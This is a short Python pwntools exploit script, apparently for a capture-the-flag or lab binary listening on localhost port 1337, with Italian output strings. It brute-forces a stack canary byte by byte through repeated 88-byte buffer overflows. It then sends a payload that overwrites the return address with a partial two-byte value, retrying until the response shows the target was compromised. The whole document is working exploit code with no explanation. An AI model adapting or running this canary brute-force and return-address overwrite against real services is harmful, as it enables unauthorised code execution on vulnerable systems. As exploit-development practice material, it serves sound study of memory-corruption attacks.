from pwn import *
import time
canary = b'\x00'
context.log_level = 'error'
p = remote('127.0.0.1', 1337)
payload = (b'A' * 88) + canary
p.sendlineafter(b'size: ', str(len(payload)).encode())
p.sendlineafter(b')!\n', payload)
print(len(payload))
p.close()

def check_canary(prova):
    
    p = remote('127.0.0.1', 1337)
    
    payload = (b'A' * 88) + prova
    p.sendline(f'{len(payload)}'.encode())
    p.sendline(payload)
    output = p.recvall(timeout=3).decode(errors='ignore')
    

    if '###' in output:
        p.close()
        return True
    elif '***' in output:
        p.close()
        return False

    

while len(canary) < 8:
    for i in range(1, 256):
        test_byte = bytes([i])
        prova = canary + test_byte
        print(len(canary))
        print(canary)
        
        if check_canary(prova):
            canary = prova  
            break
            
print(len(canary))

print(f"[!] Canary completo trovato: {canary.hex()}")


print(canary)

payload = b'A' * 88 + canary + b'A' * 8 + b'\xdd\xa4'

while True:
    p = remote('127.0.0.1', 1337, timeout=5)
    p.sendline(f"{len(payload)}".encode())
    p.sendline(payload)

    response = p.recvall(timeout=3).decode(errors='ignore')
    if 'Goodbye!' in response:
        print(response)
        time.sleep(1)
        if 'pwn' in response:
            print(response)
            time.sleep(1)
            p.close()
            break
    p.close()
